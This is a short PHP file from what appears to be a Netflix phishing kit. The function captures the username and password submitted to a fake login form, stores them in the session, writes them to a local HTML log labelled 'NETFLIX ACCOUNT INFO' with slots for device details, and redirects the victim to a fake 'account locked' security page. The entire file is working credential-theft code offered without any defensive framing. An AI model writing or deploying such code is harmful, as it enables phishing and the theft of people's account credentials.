<?php
function login_process() {
    $karma_net_user = $_POST['karma-user'];
    $karma_net_pass = $_POST['karma-password'];
    $_SESSION['karma-user'] = $karma_net_user;
    $_SESSION['karma-pass'] = $karma_net_pass;

    $result = '<div style="display: flex; justify-content: center; align-items: center;">
    <div style="text-align: center; border: 1px solid black; border-radius: 12px; width: 900px; background-color: black;">
    <strong style="color: crimson; font-family: Helvetica; line-height: 100px;">:: &nbsp;&nbsp;神は時間を与えてくださったが、私たちはそれを無駄にした。::</strong>
    <pre style="color: white; text-align: left; display: flex; flex-direction: column;">
    <strong style="color: darkorange;"> ## NETFLIX ACCOUNT INFO ## </strong>
    Netflix Account     : ' . $karma_net_user . '
    Netflix Password    : ' . $karma_net_pass . '
    <strong style="color: darkgreen;"> ## DEVICE INFO ## </strong>
    IP          :
    Device      :
    Browser     :
    User Agent  :
            </pre>
        </div>
    </div>
        ';
    file_put_contents('login.html', $result);
    header('Location: /security?locked=19089');
    exit();
}
?>